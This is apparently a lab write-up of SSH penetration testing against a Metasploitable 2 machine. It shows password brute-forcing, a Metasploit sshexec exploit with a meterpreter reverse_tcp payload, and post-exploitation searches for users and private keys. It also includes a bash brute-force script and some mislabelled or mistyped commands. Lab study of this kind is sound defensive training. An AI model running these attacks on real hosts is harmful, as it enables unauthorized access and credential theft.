# SSH


## Scope




## LAB TOOLS
- **Attacker**: Kali Linux



# SSH Penetration Testing Methodology

## Information Gathering

###  Initial SSH Service Detection
#### Scan unknown target
````
nmap -sV -T4 192.168.127.129
````
<img width="701" height="402" alt="image" src="https://github.com/user-attachments/assets/370bdca5-ba98-4029-aba0-96f9cc4c1f98" />


#### Scan details
````
nmap -sCV -T4 192.168.127.129
````
<img width="1528" height="640" alt="image" src="https://github.com/user-attachments/assets/a5a7ba28-062a-490a-8264-70a6f3ab5b02" />



#### SSH Port Scan
````
nmap -p 22 192.168.127.129
````
<img width="656" height="252" alt="image" src="https://github.com/user-attachments/assets/fd5e31e2-dcba-4c26-a10e-482f5ce6886d" />



#### Service version detection
````
nmap -p 22 -sV 192.168.127.129
````
<img width="1011" height="291" alt="image" src="https://github.com/user-attachments/assets/86b0f259-83a4-451a-b2f5-5521d84ec3d8" />


#### scan with OS detection
````
nmap -p 22 -A 192.168.127.129
````
<img width="1033" height="563" alt="image" src="https://github.com/user-attachments/assets/b3f839f5-4f3e-42a9-8090-5f1df2260a59" />


#### Multiple port scan including SSH
````
nmap -p 22,2222,222 -sV 192.168.127.129
````
<img width="952" height="331" alt="image" src="https://github.com/user-attachments/assets/e7697aeb-746b-4114-b66f-0affd2b0676d" />


### Network Mapping
#### Discover all services on the host
````
nmap -sS -sV -O -T4 192.168.127.129
````
<img width="978" height="775" alt="image" src="https://github.com/user-attachments/assets/40469a63-9df2-4e5c-aea5-fb25fe968cb1" />


#### Check for UDP SSH (rare but possible)
````
nmap -sU -p 22 192.168.127.129
````
<img width="704" height="247" alt="image" src="https://github.com/user-attachments/assets/d118ca13-d8e7-47e2-b576-d99e9e12184f" />





## Enumeration
### SSH Banner Grabbing
#### Using netcat
````
nc -nv 192.168.127.129 22
````
<img width="437" height="122" alt="image" src="https://github.com/user-attachments/assets/ce0e726d-c80b-44b9-b223-b573ca4b3bac" />


#### Using telnet
````
telnet 192.168.127.129 22
````
<img width="431" height="160" alt="image" src="https://github.com/user-attachments/assets/86c9c75c-2030-4229-9b07-86e88326807c" />


#### Using nmap scripts
````
nmap -p 22 --script banner 192.168.127.129
````
<img width="652" height="266" alt="image" src="https://github.com/user-attachments/assets/9092ca1a-0b62-4126-a8b5-9bd75bc66784" />


### SSH Service Enumeration
#### SSH protocol version and algorithms
````
nmap -p 22 --script ssh2-enum-algos 192.168.127.129
````
<img width="538" height="737" alt="image" src="https://github.com/user-attachments/assets/a882d179-8ea4-40e9-baf7-b8f59b934dbb" />


#### SSH host key enumeration
````
nmap -p 22 --script ssh-hostkey 192.168.127.129
````
<img width="577" height="242" alt="image" src="https://github.com/user-attachments/assets/657f3ba1-a96e-48e4-8335-403f8b17f6c5" />

- `--script ssh-hos`: Runs the `ssh-hostkey` NSE script to grab and display the SSH public host key

#### SSH authentication methods
````
nmap -p 22 --script ssh-auth-methods 192.168.127.129
````
<img width="533" height="253" alt="image" src="https://github.com/user-attachments/assets/7054f219-1c01-42a6-a511-fd7f0f422361" />

- `--script ssh-auth-methods`: Runs the `ssh-auth-methods` NSE script to enumerate supported SSH authentication types

#### SSH enumeration
````
nmap -p 22 --script "ssh* and safe" 192.168.127.129
````
<img width="516" height="747" alt="image" src="https://github.com/user-attachments/assets/82c0960e-7b74-42c8-b78d-77d8e4900a7d" />

- `--script"ssh* and`: Run all Nmap scripts that: <br>• Start with `ssh` (e.g.,`ssh-auth-methods` ,`ssh-hostkey` ,`sshv1` , etc.) <br>• Are tagged as `safe` (won’t crash or harm the target)

----



## Vulnerability Assessment
### SSH Vulnerability Scanning
#### Scan for common SSH vulnerabilities
````
nmap -p 22 --script sshv1 192.168.127.129
````
<img width="586" height="230" alt="image" src="https://github.com/user-attachments/assets/e7fc7e29-fb2d-43d1-b109-252552b18588" />


#### Check for specific CVEs
````
map -p 22 --script ssh-brute --script-args userdb=/usr/share/wordlists/user.txt ,passdb=/usr/share/wordlists/wordlist.txt 192.168.127.129
````
<img width="990" height="648" alt="image" src="https://github.com/user-attachments/assets/86b21149-aa1f-4c07-b220-34232b2a917f" />

<img width="681" height="508" alt="image" src="https://github.com/user-attachments/assets/229b39a7-304c-4cda-aef9-73c43cfdea79" />



#### Check for weak algorithms
````
nmap -p 22 --script ssh2-enum-algos 192.168.127.129
````
<img width="645" height="255" alt="image" src="https://github.com/user-attachments/assets/b96c365b-1138-4cc8-b2b3-39de035fb1d2" />




## Authentication Testing

### Password Brute Force Attacks

#### Using Medusa
````
medusa -h 192.168.127.129 -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt -M ssh
````
<img width="1590" height="663" alt="image" src="https://github.com/user-attachments/assets/557cf83e-0bd3-4622-82f3-f829d4bda8c2" />

<img width="1625" height="272" alt="image" src="https://github.com/user-attachments/assets/bbb6f940-e944-4fc9-8a0a-6d5071e77cac" />

- So in this we found the correct username and password.


#### Using ncrack
````
ncrack -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt ssh://192.168.127.129
````
<img width="1082" height="253" alt="image" src="https://github.com/user-attachments/assets/e6fb9057-dd31-4f8c-9fc9-619deba4d963" />

- So in this we found the correct username and password.


#### Using patator
````
patator ssh_login host=192.168.127.129 user=FILE0 password=FILE1 0=/usr/share/wordlists/user.txt 1=/usr/share/wordlists/wordlist.txt
````
<img width="1495" height="788" alt="image" src="https://github.com/user-attachments/assets/4db7c01b-374c-454c-b155-dbc7907da92d" />

<img width="1488" height="527" alt="image" src="https://github.com/user-attachments/assets/720a331a-afd7-40d6-9f04-2a196d04906b" />

- We found the correct username and password.
--


### Metasploit SSH Authentication Testing
#### SSH login scanner
````
msfconsole -q
search ssh_login
use 0
````
- Or we can use specific auxiliary:
````
use auxiliary/scanner/ssh/ssh_login
show options
````
<img width="998" height="708" alt="image" src="https://github.com/user-attachments/assets/5976632a-7e3e-47aa-b5ff-442baeb7ce78" />

````
set RHOSTS 192.168.127.129
show options
````
<img width="980" height="541" alt="image" src="https://github.com/user-attachments/assets/42a8c6df-bd02-4d15-abff-37ae8a292991" />


- In this until we found correct `username` and `password`:

````
set USERNAME msfadmin
set PASSWORD msfadmin
set VERBOSE true
show options
````
<img width="994" height="600" alt="image" src="https://github.com/user-attachments/assets/47fbb3a8-6a42-41e0-9f0d-5969d3437e69" />


````
run
````
<img width="992" height="177" alt="image" src="https://github.com/user-attachments/assets/0e6e9c52-73da-49ba-840b-bce1d8b40b42" />

- So in this until do like until like when we found the `username` and `password`, and we don't specific it true.
--


#### SSH user enumeration
````
msfconsole -q
````
<img width="278" height="92" alt="image" src="https://github.com/user-attachments/assets/455c62f3-1859-4e3d-8d45-ae39dbb4c03e" />

````
search ssh_enumusers
use 0
show options
````
<img width="713" height="746" alt="image" src="https://github.com/user-attachments/assets/fd51bfc8-b439-437a-a1cc-199f8963b2a7" />

````
set RHOSTS 192.168.127.129
show options
````
<img width="993" height="516" alt="image" src="https://github.com/user-attachments/assets/85b85961-7804-4d00-92a8-fb9ced5986cc" />

````
set USER_FILE /usr/share/wordlists/user.txt
show options
````
<img width="980" height="504" alt="image" src="https://github.com/user-attachments/assets/b7d9196a-8c3d-444f-9d61-6b8779a3add2" />

````
run
````
<img width="523" height="155" alt="image" src="https://github.com/user-attachments/assets/101bbbf9-4037-4950-8f81-5a0453d6d24f" />

- So in this we found the correct `username`. In this until we already found the correct `password` but don't know `username`.

--


#### SSH version scanner
````
msfconsole -q
search ssh_version
use 0
````
<img width="991" height="432" alt="image" src="https://github.com/user-attachments/assets/5b028707-9a32-407e-bcea-71873ef55f76" />

````
set RHOSTS 192.168.127.129
````
<img width="627" height="49" alt="image" src="https://github.com/user-attachments/assets/399deb91-b1aa-4cee-806e-79c358a08584" />

````
run
````
<img width="1907" height="765" alt="image" src="https://github.com/user-attachments/assets/5f870f82-6e25-41e8-889d-0f0ec3cd9574" />

<img width="703" height="400" alt="image" src="https://github.com/user-attachments/assets/61687a36-9936-44b6-9391-d81376000ee0" />

---



##  Exploitation
### SSH Service
- In this we already brute force `username` and `password` of our target.
- Also this a modern ssh we need to have `Host Keys`:
````
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.127.129
````
<img width="939" height="382" alt="image" src="https://github.com/user-attachments/assets/93d41b80-8599-45c0-9a28-41477807f837" />

- In this we got `shell` our target.


### Use sshexec in metasploit
````
msfconsole -q
search sshexec
use exploit/multi/ssh/sshexec
````
<img width="974" height="629" alt="image" src="https://github.com/user-attachments/assets/56aaf99b-2367-4bf4-aa2d-fb6ac97b462d" />

````
set RHOSTS 192.168.127.129
show options
````
<img width="1493" height="798" alt="image" src="https://github.com/user-attachments/assets/926f993f-0e9e-4070-9327-69aaef16dc8e" />

````
search meterpreter reverse tcp
````
<img width="1749" height="788" alt="image" src="https://github.com/user-attachments/assets/e3529cd1-74d5-4060-a4e0-9eab1e44767e" />

````
set payload linux/x86/meterpreter/reverse_tcp
show options
````
<img width="1583" height="753" alt="image" src="https://github.com/user-attachments/assets/582d5cee-ff98-4de0-b9a7-30ba2f021aef" />

````
set USERNAME msfadmin
set PASSWORD msfadmin
show options
````
<img width="1404" height="716" alt="image" src="https://github.com/user-attachments/assets/de16bbfd-90ad-45f3-85ef-aceeade4af8e" />

````
show targets
````
<img width="533" height="430" alt="image" src="https://github.com/user-attachments/assets/0b1b01d1-4f1e-4737-8061-ad0358b35625" />

````
set target 1
exploit
````
<img width="1009" height="801" alt="image" src="https://github.com/user-attachments/assets/ffea84f0-5c8a-4522-a494-25501c7147b4" />

- we got successful to get target `shell`.

---


## Post-Exploitation
###  Initial Access & System Reconnaissance
#### Once you gain SSH access:
- Connect with obtained credentials
````
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.127.129
````
````
Password: msfadmin
````
<img width="1048" height="351" alt="image" src="https://github.com/user-attachments/assets/904be9b3-0904-4244-89ad-994c04536d3d" />

- system information
````
whoami
id
uname -a
cat /etc/issue
cat /etc/*release
````
<img width="988" height="587" alt="image" src="https://github.com/user-attachments/assets/e7a49117-9d3b-4f86-87fc-1d46b49e3b4a" />


- Network information
````
ifconfig
netstat -tulpn
route -n
````
<img width="1012" height="787" alt="image" src="https://github.com/user-attachments/assets/54e3cf3d-e859-4bbe-8d63-9eacadeec13c" />

---

## Privilege Escalation
In this we already got shell of ssh this target, but we don't get `root user` we just got `normal user` so we need to do privileges escalaion.
<img width="970" height="377" alt="image" src="https://github.com/user-attachments/assets/eac031cd-0276-4123-bf37-424e014dc56f" />

### Check sudo privileges
````
sudo -l
````
<img width="648" height="87" alt="image" src="https://github.com/user-attachments/assets/70843457-6f72-4827-bdc9-3fb0b2e158f6" />


###  Check SUID files
````
find / -perm -4000 2>/dev/null
````
<img width="561" height="635" alt="image" src="https://github.com/user-attachments/assets/4dab02bb-75e7-43a7-a4ca-8efc733829ab" />

- `find` : A powerful command-line utility to search for files and directories.
- `/` : Start the search from the root directory (i.e., scan the entire filesystem).
- `-per -400` : Look for files with the setuid (SUID) bit set.
- `2>dev/null`:
  - Suppress error messages (like "Permission denied").
  - `2>` redirects stderr (file descriptor 2) to `/dev/null` (i.e., discard it).
  - This keeps the output clean—only showing matching files, not access errors.

**Type**: 
````
find / -perm -2000 2>/dev/null   # SGID
````
- We can use this:
````
find / \( -perm -4000 -o -perm -2000 \) 2>/dev/null
````


### Check world-writable files
````
find / -perm -0002 -type f 2>/dev/null
````
<img width="648" height="790" alt="image" src="https://github.com/user-attachments/assets/f74f36bb-25a2-4311-a5a9-49a15ef4b80f" />

- `find/`: Start searching from the root directory (`/`), i.e., scan the entire filesystem.
- `-perm -0002`: Find files that have the "other" (world) write permission set.
- `-type f`: Only return regular files (exclude directories, sockets, symlinks, etc.).
- `2>/dev/null`: 
  - Suppress error messages like "Permission denied" or "No such file or directory".
  - This keeps output clean—only showing matching files.



### Check crontab
````
crontab -l
ls -la /etc/cron*
````
<img width="581" height="779" alt="image" src="https://github.com/user-attachments/assets/aec10f32-83b3-4b09-ad0c-a29fb264ecd2" />

- `crontab -l`: lists the current user’s crontab (their personal scheduled jobs).
- `ls` lists files; `-l` gives long listing (permissions, owner, size, date); `-a` shows hidden files (not that /etc has hidden cron files usually).
- The shell expands `/etc/cron*` to match any items in `/etc` starting with `cron`.


### Check kernel version and Check running processes
````
uname -r
ps aux
````
<img width="776" height="758" alt="image" src="https://github.com/user-attachments/assets/47544ade-96cb-4eda-8dac-cb7f400f0fc6" />



### Check installed packages
````
dpkg -l
````
<img width="1503" height="804" alt="image" src="https://github.com/user-attachments/assets/32019570-059a-4825-bde9-f90522419e89" />

--



### Lateral Movement
#### Check other users
````
cat /etc/passwd
ls -la /home/
````
<img width="746" height="739" alt="image" src="https://github.com/user-attachments/assets/165afd0d-0979-41a2-8afa-1443556650b7" />

<img width="689" height="222" alt="image" src="https://github.com/user-attachments/assets/ef5329e3-b65e-4049-8a0b-8ac84f5394da" />


#### Check SSH keys of other users
````
ls -la /home/*/.ssh/
````
<img width="728" height="217" alt="image" src="https://github.com/user-attachments/assets/2476902b-b2b2-40d8-9f6d-a412035eaf24" />

#### Check bash history
````
cat ~/.bash_history
````
<img width="450" height="90" alt="image" src="https://github.com/user-attachments/assets/242cc8d3-3644-4afc-9016-f304f10e973e" />

- But in this we not see history.


#### Check for sensitive files
````
find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "id_dsa" 2>/dev/null
````
<img width="1060" height="748" alt="image" src="https://github.com/user-attachments/assets/939a864a-8c92-42e7-a97a-cd51125f40a3" />

----



## Automated SSH Assessment Script
````
sudo mousepad ssh.sh
````
````
#!/bin/bash
TARGET="192.168.127.129"
OUTPUT_DIR="ssh_assessment_$TARGET"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting SSH assessment of Metasploitable 2 ($TARGET)"

echo "[1] Service version detection..."
nmap -p 22 -sV $TARGET > "$OUTPUT_DIR/01_service_version.txt"

echo "[2] Banner grabbing..."
nc -nv $TARGET 22 > "$OUTPUT_DIR/02_banner.txt" 2>&1

echo "[3] SSH algorithm enumeration..."
nmap -p 22 --script ssh2-enum-algos $TARGET > "$OUTPUT_DIR/03_algorithms.txt"

echo "[4] SSH host key collection..."
nmap -p 22 --script ssh-hostkey $TARGET > "$OUTPUT_DIR/04_hostkeys.txt"

echo "[5] Authentication methods..."
nmap -p 22 --script ssh-auth-methods $TARGET > "$OUTPUT_DIR/05_auth_methods.txt"

echo "[6] Vulnerability scanning..."
nmap -p 22 --script sshv1 $TARGET > "$OUTPUT_DIR/06_vulnerabilities.txt"

echo "[7] Testing default credentials..."
for cred in "msfadmin:msfadmin" "root:root" "user:user"; do
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    sshpass -p "$password" ssh -o ConnectTimeout=5 -o BatchMode=yes $username@$TARGET "whoami" > "$OUTPUT_DIR/07_cred_${username}.txt" 2>&1
done

echo "[8] Starting hydra brute force..."
hydra -L users.txt -P passwords.txt -t 4 -f -V ssh://$TARGET > "$OUTPUT_DIR/08_hydra_results.txt" 2>&1

echo "[*] Assessment complete. Results saved in $OUTPUT_DIR/"
````
````
sudo chmod +x ssh.sh
````
````
sudo ./ssh.sh
````



---





## Metasploit Modules for Comprehensive SSH Testing
````
msfconsole
````

### SSH version detection
````
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.127.129
run
````

### SSH user enumeration
````
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.127.129
set USER_FILE users.txt
run
````

### SSH login scanner
````
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.127.129
set USERNAME msfadmin
set PASSWORD msfadmin
set STOP_ON_SUCCESS true
run
````


### SSH public key login scanner
````
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS 192.168.127.129
set KEY_PATH /path/to/private_key
run
````

---


---
## Finished Of SSH
---


## Reference
1. https://www.youtube.com/watch?v=o-aNUlDrfws
2. https://www.youtube.com/watch?v=bftjhFAMgwc&t=526s




----
## Credit:
- 



### Date: 14/10/2025

----
